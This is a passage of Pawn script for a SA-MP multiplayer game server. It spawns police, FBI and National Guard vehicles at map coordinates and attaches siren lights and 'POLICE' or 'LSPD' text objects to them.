	LVpdcar[14] = AddStaticVehicleEx(599,2315.8379,2485.5735,2.9948,89.0501,79,7,900);
	LVpdcar[15] = AddStaticVehicleEx(599,2315.9233,2490.2949,2.9937,91.2910,79,7,900);
	LVpdcar[16] = AddStaticVehicleEx(427,2313.5798,2495.3081,2.9938,90.6170,79,7,900);
	LVpdcar[17] = AddStaticVehicleEx(427,2313.4670,2500.3618,2.9954,89.8853,79,7,900);
	LVpdcar[18] = AddStaticVehicleEx(598,2281.5029,2475.1082,2.9940,0.2796,79,7,900);
	LVpdcar[19] = AddStaticVehicleEx(598,2285.9463,2475.1255,2.9941,359.6340,79,7,900);
	LVpdcar[20] = AddStaticVehicleEx(598,2277.0945,2475.0522,2.9938,359.5937,79,7,900);
	LVpdcar[21] = AddStaticVehicleEx(598,2272.4824,2475.0195,2.9943,359.5405,79,7,900);
	LVpdcar[22] = AddStaticVehicleEx(598,2268.0525,2475.0859,2.9938,358.3742,79,7,900);
	LVpdcar[23] = AddStaticVehicleEx(598,2263.7883,2475.2202,2.9940,358.0775,79,7,900);
	LVpdcar[24] = AddStaticVehicleEx(528,2264.0022,2431.1414,2.9948,359.8471,79,7,900);
	LVpdcar[25] = AddStaticVehicleEx(528,2268.1904,2431.2593,2.9947,0.4350,79,7,900);
	LVpdcar[26] = AddStaticVehicleEx(490,2250.9780,2431.2661,2.9947,0.5568,79,7,900);
	LVpdcar[27] = AddStaticVehicleEx(490,2255.4153,2431.4417,2.9961,0.7626,79,7,900);
	LVpdcar[28] = AddStaticVehicleEx(490,2246.5183,2431.2273,2.9946,1.0029,79,7,900);
	LVpdcar[29] = AddStaticVehicleEx(428,2240.4561,2441.8025,2.9940,269.0435,79,7,900);
	LVpdcar[30] = AddStaticVehicleEx(428,2240.4368,2446.8977,2.9935,268.2694,79,7,900);
	LVpdcar[31] = AddStaticVehicleEx(427,2240.5601,2476.0071,2.9947,269.4551,79,7,900);
	LVpdcar[32] = AddStaticVehicleEx(427,2240.2854,2470.8904,2.9947,266.3839,79,7,900);
	LVpdcar[33] = AddStaticVehicleEx(523,2312.2671,2431.3662,2.8435,359.7229,79,7,900);
	LVpdcar[34] = AddStaticVehicleEx(523,2308.1733,2431.2585,2.8321,2.1832,79,7,900);
	LVpdcar[35] = AddStaticVehicleEx(523,2303.5332,2431.2656,2.8425,1.4797,79,7,900);
	LVpdcar[36] = AddStaticVehicleEx(523,2298.9768,2431.2798,2.8423,357.8687,79,7,900);
	
	//SFPD Cars
	SFpdcar[1] = AddStaticVehicleEx(560,216.3999900,566.4000200,1.0000000,0.0000000,111,103,15); //Sultan
	SFpdcar[2] = AddStaticVehicleEx(599,-1587.5999800,652.5000000,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[3] = AddStaticVehicleEx(599,-1638.7998000,651.6992200,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[4] = AddStaticVehicleEx(599,-1634.1992200,651.6992200,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[5] = AddStaticVehicleEx(599,-1628.3994100,651.5996100,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[6] = AddStaticVehicleEx(599,-1622.4000200,651.5999800,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[7] = AddStaticVehicleEx(599,-1616.3994100,651.3994100,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[8] = AddStaticVehicleEx(599,-1610.5996100,651.5996100,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[9] = AddStaticVehicleEx(599,-1604.8994100,651.6992200,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[10] = AddStaticVehicleEx(599,-1599.1992200,652.3994100,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[11] = AddStaticVehicleEx(599,-1593.6992200,652.6992200,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[12] = AddStaticVehicleEx(599,-1575.6999500,652.9000200,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[13] = AddStaticVehicleEx(599,-1581.8994100,652.7998000,7.6000000,0.0000000,-1,-1,15); //Police Ranger
	SFpdcar[14] = AddStaticVehicleEx(597,-1576.5000000,672.9000200,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[15] = AddStaticVehicleEx(597,-1588.8000500,672.5999800,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[16] = AddStaticVehicleEx(597,-1582.1992200,672.5000000,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[17] = AddStaticVehicleEx(597,-1594.5000000,672.7000100,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[18] = AddStaticVehicleEx(597,-1599.9000200,672.9000200,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[19] = AddStaticVehicleEx(597,-1612.0999800,673.0999800,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[20] = AddStaticVehicleEx(597,-1605.8994100,673.0000000,7.1000000,180.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[21] = AddStaticVehicleEx(597,-1595.5999800,747.9000200,-5.4000000,0.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[22] = AddStaticVehicleEx(597,-1604.4000200,748.0000000,-5.4000000,0.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[23] = AddStaticVehicleEx(597,-1589.0000000,748.5000000,-5.4000000,0.0000000,-1,-1,15); //Police Car (SFPD)
	SFpdcar[24] = AddStaticVehicleEx(599,-1574.0999800,706.2999900,-4.9000000,270.0000000,-1,-1,15); //Police Ranger
	SFpdcar[25] = AddStaticVehicleEx(599,-1575.7998000,730.3994100,-4.9000000,270.0000000,-1,-1,15); //Police Ranger
	SFpdcar[26] = AddStaticVehicleEx(599,-1575.8994100,722.0996100,-4.9000000,270.0000000,-1,-1,15); //Police Ranger
	SFpdcar[27] = AddStaticVehicleEx(497,-1679.9000200,704.2999900,30.9000000,90.0000000,-1,-1,15); //Police Maverick
	
	// Mounten spawn
	AddStaticVehicleEx(510,609.5000000,-1467.5000000,14.2000000,272.0000000,134,68,900); //Mountain Bike
	AddStaticVehicleEx(510,609.5996100,-1466.2998000,14.2000000,272.0000000,134,68,900); //Mountain Bike
	AddStaticVehicleEx(510,609.5999800,-1468.7000000,14.2000000,272.0000000,134,68,900); //Mountain Bike
	AddStaticVehicleEx(510,609.7000100,-1469.9000000,14.2000000,272.0000000,134,68,900); //Mountain Bike
	AddStaticVehicleEx(510,609.7999900,-1471.2000000,14.3000000,272.0000000,134,68,900); //Mountain Bike
	AddStaticVehicleEx(510,609.5996100,-1466.2998000,14.2000000,272.0000000,134,68,900); //Mountain Bike

	LVpdcar[37] = AddStaticVehicleEx(411,2304.0747,2457.4907,10.5474,178.5763,79,7,900);
	object = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000, 0.0000, 0.0000);
	AttachObjectToVehicle(object, LVpdcar[37], 0.000000, 0.000000, 0.739999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar10 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar10, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar10, LVpdcar[37], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);
	LVpdcar[38] = AddStaticVehicleEx(411,2310.4553,2458.2539,10.5474,180.2667,79,7,900);
	object2 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(object2, LVpdcar[38], 0.000000, 0.000000, 0.739999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar11 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar11, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar11, LVpdcar[38], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);

    LVpdcar[39] = AddStaticVehicleEx(497,2344.7524,2473.8665,38.4056,179.4960,79,7,900);
    LVpdcar[40] = AddStaticVehicleEx(497,2319.7551,2473.6465,38.4036,181.5108,79,7,900);

    // FBI
	Fbicar[1] = AddStaticVehicleEx(541, 282.1157, -1531.4520, 24.1200, -131.4000, -1, -1, 100);
	new cacat1 = CreateObject(19620, 278.57492, -1535.39148, 24.71493,0.00000,0.00000,-132.42000);
	new cacatt1 = CreateObject(19777, 280.24469, -1536.88599, 24.33306,   0.00000, 0.00000, 54.06001);
	AttachObjectToVehicle(cacat1, Fbicar[1], 0.000000, 0.000000, 1.152499, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt1, Fbicar[1], 0.000000, 0.000000, 1.152499, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	//new policecar9151 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	//SetObjectMaterialText(policecar9151, "F.B.I.", 0, 50, "Arial", 25, 1,0xFFFFFFFF, 0, 1);
	//AttachObjectToVehicle(policecar9151, Fbicar[1],-0.000000, 1.709998, 0.464999, -92.459945, -180.900100, 0.000000); //Object Model: 19327 |


	Fbicar[2] = AddStaticVehicleEx(541, 278.8423, -1535.7694, 24.1200, -131.4000, -1, -1, 100);
	new cacat2 = CreateObject(19620, 278.57492, -1535.39148, 24.71493,0.00000, 0.00000, -132.42000);
	new cacatt2 = CreateObject(19777, 280.24469, -1536.88599, 24.33306,   0.00000, 0.00000, 54.06001);
	AttachObjectToVehicle(cacat2, Fbicar[2], 0.000000, 0.000000, 1.152499, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt2, Fbicar[2], 0.000000, 0.000000, 1.152499, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[3] = AddStaticVehicleEx(411, 289.2046, -1523.6671, 24.2171, -127.0800, -1, -1, 100);
	new cacat41 = CreateObject(19777, 283.50015, -1532.70862, 24.33306,0.00000, 0.00000, 54.06001);
	new cacatt41 = CreateObject(19620, 285.81671, -1527.68115, 24.95427,0.00000, 0.00000, -132.42000);
	AttachObjectToVehicle(cacat41, Fbicar[3], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt41, Fbicar[3], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[4] = AddStaticVehicleEx(411, 285.8884, -1527.6132, 24.2171, -127.0800, -1, -1, 100);
	new cacat42 = CreateObject(19777, 287.60037, -1528.89307, 24.36726,0.00000, 0.00000, 54.06001);
	new cacatt42 = CreateObject(19620, 289.16916, -1523.63306, 24.95427,0.00000, 0.00000, -132.42000);
	AttachObjectToVehicle(cacat42, Fbicar[4], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt42, Fbicar[4], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[5] = AddStaticVehicleEx(451, 293.0283, -1519.1548, 24.1677, -127.5000, -1, -1, 100);
	new cacat4222 = CreateObject(19777, 290.81726, -1524.81921, 24.36726,0.00000, 0.00000, 54.06001);
	new cacatt4222 = CreateObject(19620, 292.80338, -1519.04297, 24.74633,0.00000, 0.00000, -132.42000);
	AttachObjectToVehicle(cacat4222, Fbicar[5], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt4222, Fbicar[5], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[6] = AddStaticVehicleEx(490, 296.4852, -1536.2262, 24.6830, 54.4800, -1, -1, 100);
	new cacat423 = CreateObject(19777, 308.26529, -1483.25623, 25.00300,0.00000, 0.00000, 52.92000);
	new cacatt423 = CreateObject(19620, 305.55804, -1487.07520, 25.03673,11.34000, 0.36000, -132.42000);
	AttachObjectToVehicle(cacat423, Fbicar[6], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
    AttachObjectToVehicle(cacatt423, Fbicar[6], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[7] = AddStaticVehicleEx(490, 291.1036, -1544.1713, 24.6830, 54.4800, -1, -1, 100);
	new cacat424 = CreateObject(19777, 306.71271, -1488.07288, 24.58300,0.00000, 0.00000, 52.92000);
	new cacatt424 = CreateObject(19620, 278.57492, -1535.39148, 24.71493,0.00000, 0.00000, -132.42000);
	AttachObjectToVehicle(cacat424, Fbicar[7], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
    AttachObjectToVehicle(cacatt424, Fbicar[7], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[8] = AddStaticVehicleEx(490, 293.0146, -1539.9532, 24.6830, 54.4800, -1, -1, 100);
	new cacat42411 = CreateObject(18646, 290.15884, -1542.65540, 25.30390,0.00000, 0.00000, 0.00000);
	new cacatt42411 = CreateObject(19777, 288.97717, -1542.22363, 25.14570,0.00000, 0.00000, -124.26000);
	AttachObjectToVehicle(cacat42411, Fbicar[7], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
    AttachObjectToVehicle(cacatt42411, Fbicar[7], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[9] = AddStaticVehicleEx(427, 295.3499, -1513.9188, 24.5650, -127.0200, -1, -1, 100);

	Fbicar[10] = AddStaticVehicleEx(528, 298.0743, -1509.0375, 24.5147, -123.6600, -1, -1, 100);

	Fbicar[11] = AddStaticVehicleEx(601, 305.0000, -1500.8058, 24.2323, -124.5600, -1, -1, 100);

	Fbicar[12] = AddStaticVehicleEx(601, 301.6183, -1505.3778, 24.2323, -124.5600, -1, -1, 100);

	Fbicar[13] = AddStaticVehicleEx(428, 306.6194, -1481.7429, 24.5843, -127.0800, -1, -1, 100);
	new cacat43 = CreateObject(18646, 295.53214, -1534.76416, 25.30390,0.00000, 0.00000, 0.00000);
	new cacatt43 = CreateObject(19777, 294.29373, -1534.79993, 25.14570,0.00000, 0.00000, -124.26000);
	AttachObjectToVehicle(cacat43, Fbicar[13], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt43, Fbicar[13], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[14] = AddStaticVehicleEx(560, 305.4566, -1487.0240, 24.1817, -128.7000, -1, -1, 100);
	new cacat44 = CreateObject(18646, 292.06107, -1538.41760, 25.30390,0.00000, 0.00000, 0.00000);
	new cacatt44 = CreateObject(19777, 290.74567, -1538.38562, 25.14570,0.00000, 0.00000, -124.26000);
	AttachObjectToVehicle(cacat44, Fbicar[14], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	AttachObjectToVehicle(cacatt44, Fbicar[14], 0.000000, 0.000000, 0.674999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	Fbicar[15] = AddStaticVehicleEx(522, 302.4243, -1492.5231, 24.0345, -139.8600, -1, -1, 100);
	Fbicar[16] = AddStaticVehicleEx(522, 298.3307, -1491.2867, 24.0345, -139.8600, -1, -1, 100);
	Fbicar[17] = AddStaticVehicleEx(522, 299.5110, -1489.7201, 24.0345, -139.8600, -1, -1, 100);
	Fbicar[18] = AddStaticVehicleEx(522, 303.1573, -1490.0714, 24.0345, -139.8600, -1, -1, 100);


	// NG
    Ngcar[1] = AddStaticVehicleEx(470,193.6376,1919.5774,17.6540,180.1054,0,0,900);
    Ngcar[2] = AddStaticVehicleEx(470,202.7587,1919.6334,17.6540,181.0742,0,0,900);
    Ngcar[3] = AddStaticVehicleEx(470,211.6932,1919.8369,17.6623,181.5005,0,0,900);
    Ngcar[4] = AddStaticVehicleEx(470,220.7388,1920.0652,17.6579,181.7381,0,0,900);
    Ngcar[5] = AddStaticVehicleEx(433,132.9258,1850.2843,18.0898,89.3563,0,0,900);
    Ngcar[6] = AddStaticVehicleEx(520,307.6303,1838.9869,18.3638,358.6516,0,0,900);
    Ngcar[7] = AddStaticVehicleEx(425,226.0177,1887.6583,18.2148,359.6147,0,0,900);
    Ngcar[8] = AddStaticVehicleEx(425,310.2802,2056.3174,18.2243,90.7007,0,0,900);
    Ngcar[9] = AddStaticVehicleEx(476,288.7537,2025.0685,18.3619,267.4474,0,0,900);
    Ngcar[10] = AddStaticVehicleEx(476,288.5681,1990.8434,18.3630,268.1221,0,0,900);
    Ngcar[11] = AddStaticVehicleEx(476,287.0078,1957.0768,18.3637,273.1341,0,0,900);

    // LSPD Cars
	Copcar[1] = AddStaticVehicleEx(599,1526.4309,-1646.1300,5.9640,178.1691,0,1,900);
	new copcarbari22 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari22, Copcar[1], -0.894999, 2.820017, -0.334999, 17.085000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari23 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari23, Copcar[1], -0.899999, 2.730015, 0.000000, 25.124994, 0.000000, 0.000000); //Object Model: 1182 |

	Copcar[2] = AddStaticVehicleEx(428,1543.4700,-1659.0294,5.5381,89.5068,0,1,900);

	Copcar[3] = AddStaticVehicleEx(427,1543.3763,-1667.8373,5.9306,91.0264,0,1,900);

	Copcar[4] = AddStaticVehicleEx(596,1543.9248,-1676.1206,5.5380,90.4348,0,1,900);

	Copcar[5] = AddStaticVehicleEx(596,1543.3737,-1684.3055,5.5382,89.2982,0,1,900);

    Copcar[6] = AddStaticVehicleEx(411,1600.3859,-1611.2262,13.5674,88.8041,1,1,900, 1);
    new copcarbari17 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari17, Copcar[6], -0.934999, 2.810016, -0.324999, 7.035000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari18 = CreateObject(1139,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari18, Copcar[6], -0.004999, -2.425008, 0.304999, 0.000000, 0.000000, 0.000000); //Object Model: 1182 |

    object3 = CreateObject(19620,-2597.0762, -2638.4270, -5.3536, 0.0000, 0.0000, 0.0000);
	AttachObjectToVehicle(object3, Copcar[6], 0.000000, 0.000000, 0.739999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |

	new policecar = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar, Copcar[6], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);

    Copcar[7] = AddStaticVehicleEx(411,1600.5139,-1606.0381,13.5527,90.2025,1,1,900, 1);
    new copcarbari15 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari15, Copcar[7], -0.934999, 2.810016, -0.324999, 7.035000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari16 = CreateObject(1139,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari16, Copcar[7], -0.004999, -2.425008, 0.304999, 0.000000, 0.000000, 0.000000); //Object Model: 1182 |

    object4 = CreateObject(19620,-2597.0762, -2638.4270, -5.3536, 0.0000, 0.0000, 0.0000);
	AttachObjectToVehicle(object4, Copcar[7], 0.000000, 0.000000, 0.739999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar2 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar2, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar2, Copcar[7], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);

	Copcar[8] = AddStaticVehicleEx(596,1564.7928,-1710.0051,5.5384,359.9996,0,1,900);

	Copcar[9] = AddStaticVehicleEx(596,1583.3475,-1709.9602,5.5384,359.2506,0,1,900);

	Copcar[10] = AddStaticVehicleEx(523,1599.9768,-1704.3639,5.4587,92.1010,0,1,900);

	Copcar[11] = AddStaticVehicleEx(523,1600.0652,-1699.9773,5.4617,91.1802,0,1,900);

	Copcar[12] = AddStaticVehicleEx(523,1600.1055,-1695.9366,5.4615,94.0026,0,1,900);

	Copcar[13] = AddStaticVehicleEx(596,1585.9886,-1676.4564,5.5416,230.7888,0,1,900);

	Copcar[14] = AddStaticVehicleEx(599,1603.6570,-1629.4156,13.6649,90.0000,0,1,900);
	new copcarbari20 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari20, Copcar[14], -0.894999, 2.820017, -0.334999, 17.085000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari21 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari21, Copcar[14], -0.899999, 2.730015, 0.000000, 25.124994, 0.000000, 0.000000); //Object Model: 1182 |

	/*Copcar[15] = AddStaticVehicleEx(560,1575.5173,-1605.1564,12.9115,-179.9400,1,1,900, 1);
	object11 = CreateObject(19620,1575.50269,-1605.19507,13.78140,0.00000,0.12000,0.00000);
	AttachObjectToVehicle(object11, Copcar[15], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar9 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar9, "POLICE", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(policecar9, Copcar[15], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext5 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext5, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext5, Copcar[15], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/
	Copcar[15] = AddStaticVehicleEx(426,1535.9695,-1666.5758,13.1259,180.4452,1,1,900, 1);
	new copcarobj3 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj3, Copcar[15], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj3 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj3, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj3, Copcar[15], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari1 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari1, Copcar[15], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari2 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari2, Copcar[15], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |

	/*Copcar[16] = AddStaticVehicleEx(560,1571.8381,-1605.2268,12.9115,-179.9400,1,1,900, 1);
	object10 = CreateObject(19620,1571.90088,-1605.31433,13.78140,0.00000,0.12000,0.00000);
	AttachObjectToVehicle(object10, Copcar[16], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar8 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar8, "POLICE", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(policecar8, Copcar[16], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext6 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext6, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext6, Copcar[16], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/
	Copcar[16] = AddStaticVehicleEx(426,1573.0165,-1606.5100,13.1257,178.9909,1,1,900, 1);
	new copcarobj2 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj2, Copcar[16], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj2 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj2, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj2, Copcar[16], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari3 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari3, Copcar[16], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari4 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari4, Copcar[16], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |

	/*Copcar[17] = AddStaticVehicleEx(560,1568.1935,-1605.2958,12.9115,-179.9400,1,1,900, 1);
	object9 = CreateObject(19620,1568.20508,-1605.39868,13.78140,0.00000,0.12000,0.00000);
	AttachObjectToVehicle(object9, Copcar[17], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar7 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar7, "POLICE", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(policecar7, Copcar[17], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext7 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext7, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext7, Copcar[17], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/
	Copcar[17] = AddStaticVehicleEx(426,1568.1632,-1606.4669,13.1260,179.0691,1,1,900, 1);
	new copcarobj1 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj1, Copcar[17], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj1 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj1, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj1, Copcar[17], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari5 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari5, Copcar[17], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari6 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari6, Copcar[17], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |



	Copcar[18] = AddStaticVehicleEx(411,1535.9883,-1678.6243,13.1099,0.1689,1,1,900, 1);
	object5 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(object5, Copcar[18], 0.000000, 0.000000, 0.739999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar3 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar3, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar3, Copcar[18], 0.0, -1.9, 0.3, 270.0, 0.0, 0.0);
	new copcarbari13 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari13, Copcar[18], -0.934999, 2.810016, -0.324999, 7.035000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari14 = CreateObject(1139,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari14, Copcar[18], -0.004999, -2.425008, 0.304999, 0.000000, 0.000000, 0.000000); //Object Model: 1182 |

	Copcar[19] = AddStaticVehicleEx(497,1563.8638,-1700.7856,28.5752,89.4731,0,1,900, 1);

	/*Copcar[20] = AddStaticVehicleEx(560,1564.6667,-1605.3358,12.9115,-179.9400,1,1,900);
	object8 = CreateObject(19620,1564.67517,-1605.48779,13.76140,0.00000,0.12000,0.00000);
